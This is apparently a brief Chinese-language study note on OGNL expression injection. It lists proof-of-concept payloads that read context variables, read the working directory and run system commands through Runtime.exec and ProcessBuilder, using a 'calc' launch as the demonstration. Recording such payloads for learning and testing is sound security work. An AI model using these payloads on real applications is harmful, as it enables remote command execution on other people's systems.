# 	OGNL表达式注入

## 前言

具体参考

https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x01-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80

只记录POC，具体的内容等学structs的时候再去了解了。



## 表达式注入漏洞

```java
//获取context里面的变量
 #user
 #user.name

//使用runtime执行系统命令
@java.lang.Runtime@getRuntime().exec("calc")


//使用processbuilder执行系统命令
(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()

//获取当前路径
@java.lang.System@getProperty("user.dir")
```

